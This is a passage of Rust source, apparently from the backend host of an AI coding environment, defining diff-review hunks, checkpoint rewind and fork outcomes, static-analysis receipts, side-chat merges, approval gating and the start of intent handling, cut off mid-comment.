use crate::approval::{ApprovalDecision, ApprovalHub};
use crate::commands::CommandRouter;
use crate::connectors::{register_backend_connectors, ConnectorRegistry, ConnectorStatus};
use crate::interrupt::InterruptHub;
use crate::memory::{
    MemoryDraft, MemoryLedger, MemoryRecord, MemoryRevalidation, MemoryScope, MemoryStatus,
    PrivacyClass, RevalidateTarget,
};
use crate::policy::{
    derive_policy_decision, tool_declared_effects, PolicyDecision, PolicyDecisionRecord,
};
use crate::process::{ProcessState, ProcessSupervisor, StartSpec};
use crate::replay::BackendReplayService;
use crate::rewind::{self, CheckpointCoverage, FileChange, ForkPoint, RewindTarget, StateRef};
use crate::security::SecurityServices;
use crate::initialize::{ClientCapabilities, ClientInfo, ConnectionRegistry, InitializeResponse};
use crate::live_thread::LiveThread;
use crate::services::{
    BackendCapabilities, BackendServices, Budget, CheckpointRecord, CheckpointStore,
    EnvironmentNode, EnvironmentSwitch, GoalOutcome, GoalRecord, GoalStatus, GoalStore, GoalVerdict,
    JobRecord, JobStatus, JobStore, RepoNode, SharedBackend, Trigger, TriggerEvent, TrustState,
    WorkspaceEdge, WorkspaceEdgeKind, WorkspaceGraph, WorkspaceStore,
};
use crate::supervisor::{RuntimeSupervisor, SupervisorConfig};
use crate::tools::{build_default_tool_dispatcher, build_default_tool_registry};
use crate::ui_bus::UiEventBus;
use hide_core::api::{Intent, IntentAck, UiEvent, UiEventKind};
use hide_core::event::{Event, NewEvent, ToolCallEvent, ToolResultEvent};
use hide_core::ids::{EventId, RunId, SessionId, StepId};
use hide_core::observability::{HealthCheck, HealthReport, HealthStatus};
use hide_core::runtime::{ModelRole, RuntimeSupervisorState};
use hide_core::tool::{ToolCall, ToolDispatcher, ToolRegistry, ToolResult, ToolSpec, ToolStatus};
use hide_core::Result;
use hide_fleet::manager::KernelRunLauncher;
use hide_fleet::{
    AgentJob, ConcurrencyClass, FixedResourceProbe, FleetConfig, FleetGovernor, FleetManager,
    PriorityClass, ResourceSnapshot,
};
use hide_kernel::govern::{Autonomy, Interrupt};
use hide_kernel::machine::state::{AgentState, ApprovalRequest, Phase};
use hide_kernel::session::SessionProjection;
use hide_kernel::{AgentKernel, Grounding};
// Bible Book IX sec 28-29 / sec 78.1 #6: the deterministic verification plane.
// The colliding names (`Verdict`, `VerificationInput`, `Oracle`) are qualified
// as `hide_verify::*` at their (few) use sites so the function-local
// `hide_kernel::verify::oracle::*` imports in the goal path and the tests keep
// their meaning; only the non-colliding types are imported here.
use hide_verify::{
    Finding, GateDecision, ReviewRole, ReviewRoleProfile, SourceFile, StaticAnalysisOracle,
    TieredVerdict, VerificationReceipt, VerificationTier,
};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::path::{Path, PathBuf};
use std::sync::Arc;

/// A durable static-analysis verification receipt (Bible Book IX sec 29): the
/// model-free [`VerificationReceipt`] (verification_id / tier / oracle / scope /
/// source_hash / verdict / timings) FLATTENED so the receipt fields sit at the
/// top level of the recorded event, plus the typed [`Finding`]s that produced the
/// verdict (the findings-summary). Recorded as a `verify.result`-shaped event and
/// read back via [`BackendHost::verification_receipts`].
///
/// The serde shape is disjoint from a `hide_kernel` `Verdict` (that one carries a
/// top-level `status`/`score`/`detail`; this one carries `verification_id`/`tier`/
/// `scope`/`source_hash`/`verdict`{object}), so the two kinds of `verify.result`
/// payload never parse as one another and coexist in a single session log.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct StaticAnalysisReceipt {
    #[serde(flatten)]
    pub receipt: VerificationReceipt,
    /// The typed findings behind the verdict (the durable findings-summary).
    #[serde(default)]
    pub findings: Vec<Finding>,
}

impl StaticAnalysisReceipt {
    /// The deterministic verdict this receipt sealed.
    pub fn verdict(&self) -> &hide_verify::Verdict {
        &self.receipt.verdict
    }

    /// Whether the deterministic verdict passed.
    pub fn is_pass(&self) -> bool {
        self.receipt.verdict.is_pass()
    }

    /// A compact human-readable count of findings by severity (e.g.
    /// `"2 error, 1 warning"`), or `"no findings"` when clean.
    pub fn findings_summary(&self) -> String {
        use hide_verify::Severity;
        let mut error = 0usize;
        let mut warning = 0usize;
        let mut info = 0usize;
        for f in &self.findings {
            match f.severity {
                Severity::Error => error += 1,
                Severity::Warning => warning += 1,
                Severity::Info => info += 1,
            }
        }
        let mut parts = Vec::new();
        if error > 0 {
            parts.push(format!("{error} error"));
        }
        if warning > 0 {
            parts.push(format!("{warning} warning"));
        }
        if info > 0 {
            parts.push(format!("{info} info"));
        }
        if parts.is_empty() {
            "no findings".to_string()
        } else {
            parts.join(", ")
        }
    }

    /// A compact diagnostics projection derived from the sealed findings (the
    /// StatusBar Problems feed): total `errors` / `warnings` counts, a per-file
    /// breakdown, and the `last_verification_id` this receipt sealed. The FE
    /// StatusBar binds its Problems counter to these real counts instead of a
    /// hardcoded 0/0. Info-level findings are excluded (Problems shows only
    /// error/warning), so a clean source yields zeros and an empty `by_file`.
    pub fn diagnostics_projection(&self) -> Value {
        use hide_verify::Severity;
        use std::collections::BTreeMap;
        let mut errors = 0usize;
        let mut warnings = 0usize;
        // BTreeMap keeps the per-file breakdown in a stable (sorted) order so the
        // projection is deterministic for the same findings.
        let mut per_file: BTreeMap<&str, (usize, usize)> = BTreeMap::new();
        for f in &self.findings {
            let entry = per_file.entry(f.file.as_str()).or_insert((0, 0));
            match f.severity {
                Severity::Error => {
                    errors += 1;
                    entry.0 += 1;
                }
                Severity::Warning => {
                    warnings += 1;
                    entry.1 += 1;
                }
                Severity::Info => {}
            }
        }
        let by_file: Vec<Value> = per_file
            .into_iter()
            .filter(|(_, (e, w))| *e > 0 || *w > 0)
            .map(|(file, (e, w))| json!({ "file": file, "errors": e, "warnings": w }))
            .collect();
        json!({
            "errors": errors,
            "warnings": warnings,
            "by_file": by_file,
            "last_verification_id": self.receipt.verification_id,
        })
    }
}

/// One cited piece of evidence a side chat folds back to its parent (bible sec
/// 32-33): a link into the transcript (`session_id` + `event_id`) and/or into
/// code (`path` + `line`), with an optional `snippet`. All fields are optional so
/// a link can cite a transcript item, a code location, or both. This is what
/// keeps a merge CONCISE: the parent gets cited pointers, never the child's whole
/// transcript.
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct EvidenceLink {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub event_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub path: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<u32>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub snippet: Option<String>,
}

impl EvidenceLink {
    /// Cite a transcript hit (the search path in [`BackendHost::search_transcript`]
    /// produces these): session + event + the matched snippet.
    pub fn from_hit(hit: &crate::replay::TranscriptHit) -> Self {
        Self {
            session_id: Some(hit.session_id.as_str().to_string()),
            event_id: Some(hit.event_id.as_str().to_string()),
            snippet: Some(hit.snippet.clone()),
            ..Self::default()
        }
    }
}

/// The CONCISE TYPED result a side chat folds back onto its parent on merge
/// (bible sec 32-33, sec 78.1 #9): a `summary`, the `evidence` links behind it,
/// and a `kind` (the investigation type, e.g. `"investigation"` / `"review"`).
/// The parent gains this bounded result, NEVER the full child transcript.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SideChatResult {
    pub summary: String,
    #[serde(default)]
    pub evidence: Vec<EvidenceLink>,
    #[serde(default = "default_side_chat_kind")]
    pub kind: String,
}

fn default_side_chat_kind() -> String {
    "summary".to_string()
}

impl SideChatResult {
    /// A full typed result (summary + cited evidence + kind).
    pub fn new(
        summary: impl Into<String>,
        evidence: Vec<EvidenceLink>,
        kind: impl Into<String>,
    ) -> Self {
        Self {
            summary: summary.into(),
            evidence,
            kind: kind.into(),
        }
    }

    /// A bare summary (no cited evidence). The backward-compatible shape the
    /// existing `merge_side_chat` string path folds.
    pub fn summary_only(summary: impl Into<String>) -> Self {
        Self {
            summary: summary.into(),
            evidence: Vec::new(),
            kind: default_side_chat_kind(),
        }
    }

    /// The durable `session.merge_summary` event payload. `summary` stays at the
    /// top level so a parent-scoped [`BackendHost::search_transcript`] still
    /// surfaces the cited summary (role `side_chat`); `evidence` + `kind` ride
    /// alongside as the typed foldback.
    fn merge_event_payload(&self, side_chat: &SessionId) -> Value {
        json!({
            "side_chat": side_chat.as_str(),
            "summary": self.summary,
            "evidence": self.evidence,
            "kind": self.kind,
        })
    }

    /// The `side_chat_merged` UiEvent payload (under the PARENT).
    fn merged_ui_payload(&self, parent: &SessionId, side_chat: &SessionId) -> Value {
        json!({
            "kind": "side_chat_merged",
            "parent": parent.as_str(),
            "side_chat": side_chat.as_str(),
            "summary": self.summary,
            "evidence": self.evidence,
            "result_kind": self.kind,
        })
    }
}

// --- Hunk-addressable diff review (census sec 23) ---
//
// The edit flow is IMMEDIATE: the `edit.*` catalog tools (edit.search_replace /
// edit.apply_patch / edit.write_file) apply and re-verify to disk DURING the
// turn (`hide_tools::edit::run_plan` -> `std::fs::write`). So a "diff" is the set
// of changes ALREADY ON DISK; keeping a hunk marks it accepted (nothing is
// written), rejecting a hunk REVERTS it on disk via an inverse write through the
// same verifying applier. A DiffProposal is grouped per run: every agent edit
// under a `run_id` becomes one addressable hunk.

/// Review state of a single hunk.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HunkStatus {
    /// Applied to disk, not yet reviewed.
    Pending,
    /// Reviewed and kept.
    Accepted,
    /// Reverted on disk.
    Rejected,
}

/// Where a hunk came from: the originating plan step (when known), the agent
/// (the edit tool that produced it), and the turn ordinal within the diff.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DiffProvenance {
    #[serde(default)]
    pub plan_step: Option<String>,
    pub agent: String,
    pub turn: u64,
}

/// One addressable change: the whole-file pre-image/post-image for a single
/// `edit.*` call, the blake3 of the pre-image (base hash) for optimistic
/// concurrency, the review status, and the provenance.
///
/// ponytail: one edit call = one whole-file hunk. Sub-file hunk splitting is not
/// built; add it when a single edit call must be partially reverted.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DiffHunk {
    pub hunk_id: String,
    pub file: String,
    pub base_hash: String,
    pub before: String,
    pub after: String,
    pub status: HunkStatus,
    pub provenance: DiffProvenance,
}

/// A pending/applied diff: every edit captured under one run, addressable by
/// hunk. Persisted in the KV `diffs` namespace keyed by `diff_id` and mirrored by
/// durable `diff.*` events on the session log.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DiffProposal {
    pub diff_id: String,
    pub run_id: String,
    pub session_id: SessionId,
    pub created_ms: u64,
    /// The diff's origin (the first hunk's provenance): the `created_from` view.
    pub created_from: DiffProvenance,
    pub hunks: Vec<DiffHunk>,
}

impl DiffProposal {
    fn hunk(&self, hunk_id: &str) -> Option<&DiffHunk> {
        self.hunks.iter().find(|h| h.hunk_id == hunk_id)
    }
    fn hunk_mut(&mut self, hunk_id: &str) -> Option<&mut DiffHunk> {
        self.hunks.iter_mut().find(|h| h.hunk_id == hunk_id)
    }
}

/// A sealed review receipt over a diff (census sec 23): the hunks with their
/// accept/reject status + provenance, and the verification receipts before and
/// after the review. `seal` is a blake3 over the canonical body so tampering is
/// detectable. Recorded as a `diff.receipt` event and read back via
/// [`BackendHost::diff_review_receipts`].
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DiffReviewReceipt {
    pub diff_id: String,
    pub run_id: String,
    pub hunks: Vec<DiffHunk>,
    pub verification_before: Vec<VerificationReceipt>,
    pub verification_after: Vec<VerificationReceipt>,
    pub sealed_ms: u64,
    pub seal: String,
}

// --- Checkpoint rewind / replay / fork / compare outcomes (Trace E) ---------

/// The result of a [`BackendHost::checkpoint_rewind`]: a fresh, independent child
/// session whose history reverts one domain (code / conversation / both) back to
/// the checkpoint boundary, plus what the rewind reverted and invalidated.
#[derive(Debug, Clone, Serialize)]
pub struct RewindOutcome {
    /// The rewound child (a new lineage; the source is untouched).
    pub session_id: SessionId,
    /// Which domain(s) were reverted.
    pub target: RewindTarget,
    /// The partial-history fork boundary (inherited context vs the child's own).
    pub fork_point: ForkPoint,
    /// Files whose post-boundary code edits this rewind reverted (empty for a
    /// conversation-only rewind).
    pub reverted_files: Vec<String>,
    /// Verification receipts (source event ids) this rewind invalidates.
    pub invalidated_receipts: Vec<EventId>,
    /// The rebuilt projection of the child.
    pub projection: SessionProjection,
    /// The durable ancestry record (parent + boundary) of the child.
    pub ancestry: crate::services::SessionRecord,
}

/// The result of a [`BackendHost::checkpoint_replay`]: a fresh child that re-applies
/// the whole recorded history from the checkpoint forward onto an independent
/// lineage seeded at the checkpoint.
#[derive(Debug, Clone, Serialize)]
pub struct ReplayOutcome {
    pub session_id: SessionId,
    pub fork_point: ForkPoint,
    /// The source event ids replayed after the checkpoint boundary (in order).
    pub replayed_events: Vec<EventId>,
    pub projection: SessionProjection,
    pub ancestry: crate::services::SessionRecord,
}

/// The result of a [`BackendHost::checkpoint_fork`]: an ephemeral branch seeded
/// only with the checkpoint's inherited prefix, to explore an alternative.
#[derive(Debug, Clone, Serialize)]
pub struct ForkOutcome {
    pub session_id: SessionId,
    pub fork_point: ForkPoint,
    pub projection: SessionProjection,
    pub ancestry: crate::services::SessionRecord,
}

/// A model-free code comparison between two references (a checkpoint boundary or
/// a session tail): the file-level changes.
#[derive(Debug, Clone, Serialize)]
pub struct CodeComparison {
    pub base: String,
    pub head: String,
    pub files: Vec<FileChange>,
}

/// A [`BackendHost::checkpoint_inspect`] report: whether the sealed integrity
/// holds, whether the coverage recomputed from the current log still matches
/// (drift detection), and which verification receipts a code rewind invalidates.
#[derive(Debug, Clone, Serialize)]
pub struct CheckpointInspection {
    pub checkpoint_id: String,
    /// The sealed integrity digest verifies (boundary + coverage untampered).
    pub integrity_ok: bool,
    /// The coverage recomputed from the CURRENT source log at the boundary still
    /// matches the sealed coverage (no drift).
    pub coverage_current: bool,
    /// Which covered references drifted (empty when `coverage_current`). The goal
    /// reference is a current-state pointer (not event-sourced), so it can drift
    /// legitimately if the goal changed; repo/thread/plan drift means tamper.
    pub drift: Vec<String>,
    /// Files a code rewind from this checkpoint would revert.
    pub reverted_files: Vec<String>,
    /// Verification receipts a code rewind from this checkpoint invalidates.
    pub invalidated_receipts: Vec<EventId>,
    pub coverage: CheckpointCoverage,
}

/// Which covered references drift between a sealed coverage and a freshly
/// recomputed one (field names, deterministic order).
fn coverage_drift(sealed: &CheckpointCoverage, current: &CheckpointCoverage) -> Vec<String> {
    let mut drift = Vec::new();
    if sealed.repo_state != current.repo_state {
        drift.push("repo_state".to_string());
    }
    if sealed.thread != current.thread {
        drift.push("thread".to_string());
    }
    if sealed.plan != current.plan {
        drift.push("plan".to_string());
    }
    if sealed.goal != current.goal {
        drift.push("goal".to_string());
    }
    if sealed.artifacts != current.artifacts {
        drift.push("artifacts".to_string());
    }
    drift
}

/// A stateless facade over the KV `diffs` namespace keyed by `diff_id`, mirroring
/// how [`crate::services::GoalStore`] wraps `goals`.
struct DiffStore;

impl DiffStore {
    const NAMESPACE: &'static str = "diffs";

    fn put(kv: &hide_core::persistence::DynKeyValueStore, record: &DiffProposal) -> Result<()> {
        kv.put(Self::NAMESPACE, &record.diff_id, serde_json::to_value(record)?)
    }

    fn get(kv: &hide_core::persistence::DynKeyValueStore, diff_id: &str) -> Option<DiffProposal> {
        kv.get(Self::NAMESPACE, diff_id)
            .ok()
            .flatten()
            .and_then(|v| serde_json::from_value(v).ok())
    }
}

/// Every `Intent::Custom` name [`BackendHost::handle_intent`] actually acts on. A name that is NOT
/// here (and is not approval-gated, which is handled separately) gets an HONEST negative ack: the
/// event is still recorded, but the caller is told there is no handler rather than being handed
/// `accepted: true`. Keep in lockstep with the snapshot arms in `handle_intent`.
///
/// RETIRED rather than whitelisted: `open_folder` and `compact_context` were listed here purely
/// so the negative ack could not fire for them, while their arms were empty and no reader existed
/// (the claimed `hawking-context::compiler` watermark reader is not there). A name earns a place
/// here by having an arm that acts, so both left the wire contract instead.
const HANDLED_CUSTOM_NAMES: &[&str] = &[
    "approve_effect",
    "approve_gate",
    "approve_plan",
    "attach_process",
    "capture_process_artifact",
    "checkpoint_compare",
    "checkpoint_create",
    "checkpoint_fork",
    "checkpoint_inspect",
    "checkpoint_replay",
    "checkpoint_restore",
    "checkpoint_rewind",
    "create_side_chat",
    "create_worktree",
    "deny_effect",
    "deny_gate",
    "edit_plan_step",
    "environment_switch",
    "export_review_receipt",
    "goal_clear",
    "goal_evaluate",
    "goal_set",
    "grant_write_lease",
    "memory_add",
    "memory_record_outcome",
    "memory_revalidate",
    "memory_supersede",
    "merge_side_chat",
    "new_session",
    "open_session",
    "promote_run",
    "pty_input",
    "pty_resize",
    "redirect_run",
    "reorder_plan",
    "repair_step",
    "resume_run_foreground",
    "revert_diff",
    "revoke_write_lease",
    "run_search",
    "run_static_analysis",
    "save_file",
    "search",
    "search_transcript",
    "skip_step",
    "steer",
    "stop_process",
    "workspace_set_repo_trust",
];

pub struct BackendHost {
    pub services: SharedBackend,
    pub connectors: Arc<ConnectorRegistry>,
    pub tools: Arc<ToolRegistry>,
    /// The one permission-gated, verifying applier. A frontend save reaches it the way the agent's
    /// edits do, through [`BackendHost::dispatch_tool`] (no second write channel).
    pub dispatcher: Arc<ToolDispatcher>,
    pub security: SecurityServices,
    pub replay: BackendReplayService,
    commands: CommandRouter,
    /// The push Wire-B bus (broadcast + coalescing). The pull `ui_events` API is
    /// retained for replay/catch-up; this is the live path.
    ui_bus: Arc<UiEventBus>,
    /// Shared with the CommandRouter so control intents reach running runs.
    interrupts: Arc<InterruptHub>,
    /// The per-run approval mailbox. A live kernel turn under bounded
    /// `SuggestOnly` autonomy PAUSES on an effectful step; an `approve_effect`/
    /// `deny_effect` intent deposits the decision here, and the running turn
    /// drains it to resume (approve) or skip the step (deny). Without this, an
    /// effectful turn spun `Paused` until the Governor aborted at the step cap.
    approvals: Arc<ApprovalHub>,
    /// Genuinely destructive commands ([`dangerous_command`]) are not dropped - they are parked
    /// here under a unique gate id and surfaced as a `SecurityGate` UiEvent. An `approve_gate`
    /// intent with that id releases and runs the command; `deny_gate` drops it.
    gate_book: Arc<GateBook>,
    /// The supervised `hawking serve` runtime, present only when a model is
    /// configured (`HIDE_MODEL_WEIGHTS` set). `None` keeps the host fully usable
    /// headless: the ~410 unit tests never spawn a server. When present, its
    /// state machine (`Down -> Booting -> Ready -> Degraded -> Failed`) is
    /// surfaced through `health()`/`status()`, and `base_url()` (once `Ready`)
    /// is where `SubmitTurn` generation is routed.
    runtime: Option<Arc<RuntimeSupervisor>>,
    /// The session-aware terminal process surface (Trace D). Terminal commands and
    /// long-lived service processes run sandbox-confined here, stream incrementally,
    /// persist across navigation, and can be captured as durable artifacts.
    processes: Arc<ProcessSupervisor>,
    /// Per-connection negotiated capabilities (Stage 4 Initialize handshake): the
    /// experimental-api gate and the opt-out notification method set, consulted in
    /// the notification emit path so a connection never receives a class of pushes
    /// it opted out of.
    connections: Arc<ConnectionRegistry>,
}

impl BackendHost {
    pub fn open_workspace(workspace_root: impl Into<PathBuf>) -> Result<Self> {
        Self::from_services(BackendServices::open_workspace(workspace_root)?)
    }

    pub fn from_services(services: BackendServices) -> Result<Self> {
        let services = Arc::new(services);
        let tools = Arc::new(build_default_tool_registry());
        let ui_bus = Arc::new(UiEventBus::default());
        // RECORDED at construction, so there is no such thing as a dispatch through this host that
        // produces no tool events and no reviewable diff.
        let dispatcher = Arc::new(
            build_default_tool_dispatcher(&services.config, tools.clone()).with_observer(Arc::new(
                DispatchRecorder::new(services.clone(), ui_bus.clone()),
            )),
        );
        let connectors = Arc::new(ConnectorRegistry::default());
        register_backend_connectors(&connectors, &services);
        let interrupts = Arc::new(InterruptHub::default());
        let runtime = Self::maybe_boot_runtime(&services);
        // Re-register the runtime connector now that the supervisor exists, so its `state` method
        // is a real read of the engine instead of a guess from the static role registry.
        connectors.register(crate::connectors::runtime_connector(
            &services,
            runtime.clone(),
        ));
        Ok(Self {
            commands: CommandRouter::with_interrupts(
                services.event_log.clone(),
                interrupts.clone(),
            ),
            replay: BackendReplayService::new(
                services.event_log.clone(),
                services.projection_store.clone(),
            ),
            services,
            connectors,
            tools,
            dispatcher,
            security: SecurityServices::default(),
            processes: Arc::new(ProcessSupervisor::new(ui_bus.clone())),
            ui_bus,
            interrupts,
            approvals: Arc::new(ApprovalHub::default()),
            gate_book: Arc::new(GateBook::default()),
            runtime,
            connections: Arc::new(ConnectionRegistry::default()),
        })
    }

    /// Construct + (in the background) boot the runtime supervisor, GATED behind
    /// the `HIDE_MODEL_WEIGHTS` env var. When unset (the headless/test default)
    /// this returns `None` and NO server is ever spawned, so the ~410 unit tests
    /// stay model-free. When set to a weights path, the `RuntimeSupervisor` is
    /// built for `hawking serve --weights <path>` and `boot()` is spawned on the
    /// current tokio runtime so construction stays synchronous and NON-FATAL: a
    /// missing binary, a bad path, or a `/healthz` that never comes up just
    /// leaves the supervisor in `Failed`/`Booting`; the host is still returned
    /// and fully usable (it will report "model offline" rather than fake a
    /// token). The bind addr is overridable via `HIDE_MODEL_ADDR`
    /// (default 127.0.0.1:8745, distinct from hide-serve's own 8744).
    fn maybe_boot_runtime(services: &Arc<BackendServices>) -> Option<Arc<RuntimeSupervisor>> {
        let weights = std::env::var("HIDE_MODEL_WEIGHTS").ok()?;
        if weights.trim().is_empty() {
            return None;
        }
        let bind = std::env::var("HIDE_MODEL_ADDR")
            .ok()
            .filter(|s| !s.trim().is_empty())
            .unwrap_or_else(|| "127.0.0.1:8745".to_string());
        let layout = services.layout();
        let cfg = SupervisorConfig::for_hawking_serve(
            bind,
            &services.config.workspace_root,
            &weights,
            layout.hide_dir.join("runtime.lock"),
        );
        let supervisor = Arc::new(RuntimeSupervisor::for_hawking_serve(cfg));
        // Boot in the background so construction is sync + non-fatal. If we are
        // not inside a tokio runtime (a sync test that set the env var), skip the
        // spawn but still hand back the (Down) supervisor: health/status report
        // it honestly and generation surfaces "model offline".
        if let Ok(handle) = tokio::runtime::Handle::try_current() {
            let sup = supervisor.clone();
            handle.spawn(async move {
                if let Err(e) = sup.boot().await {
                    // Non-fatal: the supervisor already transitioned to Failed and
                    // recorded the reason; just surface it (consistent with the
                    // supervisor's own eprintln! diagnostics).
                    eprintln!("warning: runtime supervisor boot failed (non-fatal): {e}");
                }
            });
        }
        Some(supervisor)
    }

    /// Subscribe to the live push UiEvent stream (Wire-B). Ordered; a lagging
    /// subscriber gets a `Lagged` signal rather than stalling the host.
    pub fn subscribe_ui(&self) -> tokio::sync::broadcast::Receiver<UiEvent> {
        self.ui_bus.subscribe()
    }

    /// The push UiEvent bus (for callers that want to publish/coalesce directly).
    pub fn ui_bus(&self) -> &Arc<UiEventBus> {
        &self.ui_bus
    }

    /// The interrupt hub control intents signal onto (shared with the kernel).
    pub fn interrupts(&self) -> &Arc<InterruptHub> {
        &self.interrupts
    }

    /// The approval hub `approve_effect`/`deny_effect` intents deposit onto
    /// (shared with the running kernel turn). A paused effectful step drains it
    /// to resume or skip.
    pub fn approvals(&self) -> &Arc<ApprovalHub> {
        &self.approvals
    }

    /// The supervised runtime's state (`None` when no model is configured, i.e.
    /// `HIDE_MODEL_WEIGHTS` unset). Surfaced so the FE's `RuntimeStatus` can
    /// reflect down/booting/ready/degraded/failed.
    pub fn runtime_state(&self) -> Option<RuntimeSupervisorState> {
        self.runtime.as_ref().map(|s| s.state())
    }

    /// The base URL of the supervised runtime, but only when it is `Ready`. A
    /// `None` here means "no model online to generate against", so the caller
    /// surfaces that as a `RuntimeStatus`/`Error` UiEvent rather than faking a
    /// token.
    fn runtime_base_url(&self) -> Option<String> {
        let sup = self.runtime.as_ref()?;
        if sup.state() == RuntimeSupervisorState::Ready {
            sup.base_url()
        } else {
            None
        }
    }

    /// Handle a Wire-A intent. The `IntentAck` is returned SYNCHRONOUSLY (the
    /// contract is unchanged); generation, when an accepted `SubmitTurn`
    /// triggers it, is spawned as a background task that streams tokens onto the
    /// Wire-B bus. The ack does not wait for generation.
    pub async fn handle_intent(&self, intent: Intent) -> Result<IntentAck> {
        // Snapshot the SubmitTurn parameters before the router consumes the
        // intent (it takes `intent` by value and returns only an `IntentAck`).
        let submit = match &intent {
            Intent::SubmitTurn {
                session_id, text, ..
            } => Some((session_id.clone(), text.clone())),
            _ => None,
        };
        // Snapshot a RunCommand too: an accepted one actually executes in the workspace and streams
        // its output back as tool_progress (the integrated terminal renders those rows).
        let run_cmd = match &intent {
            Intent::RunCommand { argv, cwd } => Some((argv.clone(), cwd.clone())),
            _ => None,
        };
        // Terminal / process custom intents. `pty_input` writes bytes to a live process's stdin,
        // `pty_resize` records its terminal geometry (`{ process?, data }` / `{ process?, cols,
        // rows }`; an absent `process` targets the most recently started live process).
        // `attach_process`, `stop_process` and `capture_process_artifact` address ONE named
        // process (`{ process }`): re-attach after a navigation, stop what you started, keep the
        // output as a durable artifact.
        let process_action: Option<(String, Value)> = match &intent {
            Intent::Custom { name, payload }
                if matches!(
                    name.as_str(),
                    "pty_input"
                        | "pty_resize"
                        | "attach_process"
                        | "stop_process"
                        | "capture_process_artifact"
                ) =>
            {
                Some((name.clone(), payload.clone()))
            }
            _ => None,
        };
        // A held command's approve/deny round-trip: `approve_gate`/`deny_gate` carry the gate id the
        // `SecurityGate` UiEvent was emitted with. `(approve, gate_id)`.
        let gate_action: Option<(bool, String)> = match &intent {
            Intent::Custom { name, payload } if name == "approve_gate" || name == "deny_gate" => {
                payload
                    .get("gate")
                    .and_then(|v| v.as_str())
                    .map(|g| (name == "approve_gate", g.to_string()))
            }
            _ => None,
        };
        // A paused effectful kernel step's approve/deny round-trip: `approve_effect`/
        // `deny_effect` carry the `run_id` (and optional `step_id`) the
        // `approval.requested` event was emitted with. `(approve, run_id, step_id)`.
        let approval_action: Option<(bool, RunId, Option<StepId>)> = match &intent {
            Intent::Custom { name, payload }
                if name == "approve_effect" || name == "deny_effect" =>
            {
                payload.get("run_id").and_then(|v| v.as_str()).map(|r| {
                    let step = payload
                        .get("step_id")
                        .and_then(|v| v.as_str())
                        .map(StepId::from);
                    (name == "approve_effect", RunId::from(r), step)
                })
            }
            _ => None,
        };
        // A ForkSession intent (bible sec 78.1 #7): snapshot the source + boundary
        // so, once the router has recorded the intent, the host actually forks a
        // new independent session, records ancestry, and surfaces the new thread.
        let fork_action: Option<(SessionId, hide_core::ids::EventId)> = match &intent {
            Intent::ForkSession {
                session_id,
                at_event,
            } => Some((session_id.clone(), at_event.clone())),
            _ => None,
        };
        // Side-chat lifecycle custom intents (bible sec 32-33, sec 78.1 #9):
        // `create_side_chat` forks a read-only side chat; `merge_side_chat` folds
        // its typed summary back onto the parent. Snapshotted so we act once the
        // router has recorded the intent (mirrors the ForkSession path).
        let side_chat_action: Option<(String, Value)> = match &intent {
            Intent::Custom { name, payload }
                if name == "create_side_chat" || name == "merge_side_chat" =>
            {
                Some((name.clone(), payload.clone()))
            }
            _ => None,
        };
        // Launcher (courtyard) custom intents: snapshot the ones with a side effect so we can act after
        // the router has recorded them in the event log.
        let launcher_action: Option<(String, Value)> = match &intent {
            Intent::Custom { name, payload }
                if matches!(
                    name.as_str(),
                    "create_worktree" | "new_session" | "open_session"
                ) =>
            {
                Some((name.clone(), payload.clone()))
            }
            _ => None,
        };
        // Durable Goal + Checkpoint custom intents (bible sec 14, sec 15.4, sec
        // 78.1 #3): snapshot so we act once the router has recorded the intent
        // (mirrors the ForkSession / side-chat paths).
        let goal_checkpoint_action: Option<(String, Value)> = match &intent {
            Intent::Custom { name, payload }
                if matches!(
                    name.as_str(),
                    "goal_set"
                        | "goal_clear"
                        | "checkpoint_create"
                        | "checkpoint_restore"
                        | "checkpoint_rewind"
                        | "checkpoint_replay"
                        | "checkpoint_fork"
                        | "checkpoint_compare"
                        | "checkpoint_inspect"
                ) =>
            {
                Some((name.clone(), payload.clone()))
            }
            _ => None,
        };
        // Mid-turn STEER (census priority 6, the true end-to-end hole): the FE
        // `redirect_run` gesture carries `{ run_id, text, session_id? }`. Snapshot
        // it so, once the router has recorded the intent, we deliver a real
        // `InterruptHub::Steer` to the running kernel (mirrors how CancelRun/
        // PauseRun route to Abort/Pause) and persist a durable `turn.steer` event.
        let steer_action: Option<(RunId, String, Option<SessionId>)> = match &intent {
            Intent::Custom { name, payload } if name == "redirect_run" || name == "steer" => {
                payload
                    .get("run_id")
                    .and_then(|v| v.as_str())
                    .map(|run| {
                        let text = payload
                            .get("text")
                            .or_else(|| payload.get("instruction"))
                            .or_else(|| payload.get("directive"))
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string();
                        let session = payload
                            .get("session_id")
                            .and_then(|v| v.as_str())
                            .map(SessionId::from);
                        (RunId::from(run), text, session)
                    })
            }
            _ => None,
        };
        // Durable Memory + Goal-eval + Workspace-trust + Environment-switch custom
        // intents (bible sec 21-22, 14, 35): snapshot so we route to the existing
        // tested host method once the router has recorded the intent (mirrors the
        // goal/checkpoint path).
        let memory_workspace_env_action: Option<(String, Value)> = match &intent {
            Intent::Custom { name, payload }
                if matches!(
                    name.as_str(),
                    "memory_add"
                        | "memory_supersede"
                        | "memory_record_outcome"
                        | "memory_revalidate"
                        | "goal_evaluate"
                        | "workspace_set_repo_trust"
                        | "environment_switch"
                ) =>
            {
                Some((name.clone(), payload.clone()))
            }
            _ => None,
        };

        // Stage 4 background-promotion custom intents: `promote_run` promotes a
        // live interactive run to a durable background job (no restart);
        // `resume_run_foreground` reattaches a reconnecting client to a promoted
